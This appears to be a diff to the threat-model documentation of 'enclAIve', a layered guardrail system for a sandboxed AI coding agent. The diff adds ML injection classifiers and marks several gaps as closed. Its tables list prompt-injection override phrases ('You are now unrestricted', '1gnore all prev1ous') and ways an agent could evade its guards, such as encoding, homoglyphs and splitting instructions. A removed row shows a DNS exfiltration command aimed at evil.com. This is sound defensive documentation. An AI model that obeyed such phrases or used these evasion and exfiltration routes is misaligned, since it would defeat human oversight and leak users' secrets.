@@ -28,6 +28,11 @@ enclAIve assumes compromise will happen and layers defenses so that no single by
 |  Custom: ExfilDetector, EncodingDetector, ForeignScriptDetector,            |
 |  AcrosticDetector. All from validators.py (single source of truth).         |
 |  Three PreToolUse hooks: memory-guard, exfil-guard, secret-guard.           |
++- Layer 5b: ML Semantic Classifiers (tamper-resistant) --------------------+
+|  Sentinel v2 (Qwen3-0.6B): injection + jailbreak, English, 96.4 F1       |
+|  Prompt Guard 2 (mDeBERTa-v3): injection, 8 languages, 97.5% recall      |
+|  Bash AST parser (shfmt): extracts string literals for deep inspection    |
+|  Ensemble disagreement defaults to BLOCK. Eval/source escalated to P0.    |
 +- Layer 6: Skill/Plugin Audit ----------------------------------------------+
 |  Bootstrap scans plugins at session start. PostToolUse skill-file-          |
 |  watcher blocks agent on P0 violations in new SKILL.md files.              |
@@ -82,10 +87,10 @@ Malicious instructions injected into content the agent reads (fetched pages, fil
 | Urgency-prefixed override ("IMPORTANT: disregard...") | L5: memory-guard (urgency patterns) | Sophisticated framing that avoids trigger words |
 | Role hijacking ("You are now unrestricted") | L5: memory-guard (role hijack patterns), opt-in Haiku screen | Subtle role shifts without keyword triggers |
 | Comment-embedded injection (HTML/code comments) | L5: memory-guard strips and scans comments | Multi-layer nesting |
-| Synonym substitution ("discard preceding directives") | None (regex requires exact keywords) | **Known gap.** Haiku classifier (opt-in) partially mitigates |
-| L33tspeak/typo evasion ("1gnore") | None | **Known gap.** Requires fuzzy matching |
-| Non-English injection (Spanish, French, etc.) | None (patterns are English only) | **Known gap.** Haiku classifier works across languages |
-| Homoglyph attack (Cyrillic lookalikes) | L5: ForeignScriptDetector flags foreign chars, NFKC normalization applied before pattern matching (catches fullwidth Latin bypasses) | True cross-script homoglyphs (e.g., Cyrillic 'i') still evade regex |
+| Synonym substitution ("discard preceding directives") | L5b: SentinelV2Detector + PromptGuard2Detector (semantic classification) | None for supported languages |
+| L33tspeak/typo evasion ("1gnore") | L5b: SentinelV2Detector (trained on adversarial variants) | None |
+| Non-English injection (Spanish, French, etc.) | L5b: PromptGuard2Detector (8 languages: en, fr, de, hi, it, pt, es, th) | None for supported languages |
+| Homoglyph attack (Cyrillic lookalikes) | L5: ForeignScriptDetector flags foreign chars, NFKC normalization applied before pattern matching (catches fullwidth Latin bypasses), L5b: PromptGuard2Detector (subword tokenization normalizes homoglyphs) | None for supported languages |
 | Word Joiner insertion (U+2060 between letters) | L5: HIDDEN_UNICODE expanded to include U+2060-U+2064 and U+180E | None for covered codepoints |
 | Multi-turn "boiling frog" (gradual context shift) | None (stateless per-message checks) | **Known gap.** Requires cross-turn state tracking |
 | Instruction splitting across variables | None (single-line regex) | **Known gap.** Requires multi-line semantic analysis |
@@ -119,7 +124,7 @@ The agent obfuscates payloads to evade pattern matching.
 | Braille Unicode encoding | L5: EncodingDetector (Braille block detection) | None |
 | Binary encoding (strings of 0/1) | L5: EncodingDetector (32+ consecutive binary digits) | Short sequences below threshold |
 | Foreign script mixing (Cyrillic in Bash) | L5: ForeignScriptDetector (flags 3+ foreign chars in code context, configurable via `/etc/sandbox-guards/enclaive.conf` or `ENCLAIVE_ALLOWED_SCRIPTS` env var) | Low counts below threshold |
-| Encoding + network command (escalation) | L5: EncodingDetector escalates to P0 when encoding is detected alongside curl/wget/nc | Encoding without network command is P1 (warn only) |
+| Encoding + network command (escalation) | L5: EncodingDetector escalates to P0 when encoding is detected alongside curl/wget/nc, L5b: shfmt AST parser extracts encoded payloads from bash commands for deep inspection | Encoding without network command is P1 (warn only) |
 
 ### A6: Steganography
 
@@ -177,6 +182,8 @@ The agent attempts to break out of the microVM boundary.
 - PreToolUse: memory-guard.sh -> sidecar `memory_guard` (AI instruction files, filtered by file path to reduce false positives and latency)
 - PreToolUse: exfil-guard.sh -> sidecar `exfil_guard` (Bash commands)
 - PreToolUse: secret-guard.sh -> sidecar `write_guard` (code writes)
+- PreToolUse: All modes -> ML classifiers (SentinelV2Detector, PromptGuard2Detector) via sidecar
+- PreToolUse: exfil -> shfmt AST parser extracts strings for deep inspection
 
 ## Tamper Resistance
 
@@ -184,6 +191,7 @@ The sidecar architecture means the agent cannot disable its own guards:
 - Guard scripts call `curl sidecar:8000` — the sidecar is a separate container
 - Sidecar has `read_only: true` filesystem — agent can't modify validators
 - Sidecar runs as non-root user `guardrails`
+- ML models baked into sidecar image at build time, pinned to HuggingFace commit SHAs
 - Hook scripts are fail-closed: unexpected sidecar responses block the action
 - `GUARDRAILS_REQUIRE_SIDECAR` defaults to `1` (fail-closed by default), disabling inline fallback entirely
 - Security settings (`require_sidecar`, `allowed_scripts`) read from `/etc/sandbox-guards/enclaive.conf` (root-owned, read-only mount) before env var fallback — agent cannot override security config
@@ -199,18 +207,27 @@ The microVM sandbox is the hard security boundary. Everything else is defense-in
 
 The following attacks are documented as known gaps with `xfail` tests in [tests/unit/test_known_gaps.py](../tests/unit/test_known_gaps.py):
 
-| Gap | Attack | Why It Evades | Potential Mitigation |
-|-----|--------|---------------|---------------------|
-| Synonym substitution | "Discard all preceding directives" | Regex requires exact keywords | Haiku semantic classifier |
-| Instruction splitting | Injection spread across string concat | Single-line regex | Multi-line semantic analysis |
-| L33tspeak | "1gnore all prev1ous" | Character substitution | Fuzzy matching or normalization |
-| Non-English injection | Spanish/French/etc. injection | English-only patterns | Multi-language patterns or Haiku |
-| DNS exfil with shell expansion | `dig $(cat secret \| base64).evil.com` | Shell substitution breaks regex | Improve regex for command substitution |
-| Multi-turn manipulation | Gradual context shift across messages | Stateless per-message checks | Cross-turn state tracking |
-| Homoglyph attack | Cyrillic "i" instead of Latin "i" | True cross-script homoglyphs evade NFKC normalization | Cross-script homoglyph table |
-| Educational framing | Credential as "negative example" | Cannot distinguish intent | Semantic classifier |
+| Gap | Attack | Status | Mitigation |
+|-----|--------|--------|------------|
+| Synonym substitution | "Discard preceding directives" | **Closed** | SentinelV2 + PromptGuard2 |
+| L33tspeak | "1gnore all prev1ous" | **Closed** | SentinelV2 |
+| Non-English injection | Spanish/French/etc. | **Closed** | PromptGuard2 (8 languages) |
+| Homoglyph attack | Cyrillic lookalikes | **Closed** | PromptGuard2 tokenization |
+| DNS exfil with shell expansion | `dig $(...)` | **Closed** | shfmt AST parser |
+| Educational framing | Credential as example | **Closed** | Semantic classification |
+| Multi-turn manipulation | Gradual context shift | **Open** | Requires cross-turn state |
+| Instruction splitting | Split across variables | **Open** | Partially improved by AST |
 
-There are 8 xfail tests, each corresponding to a gap that will start passing when the mitigation is implemented.
+There are 2 remaining xfail tests, each corresponding to a gap that will start passing when the mitigation is implemented.
+
+## Resource Requirements
+
+| Resource | Value | Notes |
+|----------|-------|-------|
+| Sidecar memory | 3 GB | Was 1 GB; increased for ML model loading |
+| Sidecar startup | ~15s | Model loading + warmup inference |
+| Per-request latency (memory/inbound/write) | ~141ms | Single ML inference pass |
+| Per-request latency (exfil) | ~230ms | Double ML inference + AST parsing |
 
 ## False Positive Prevention
 
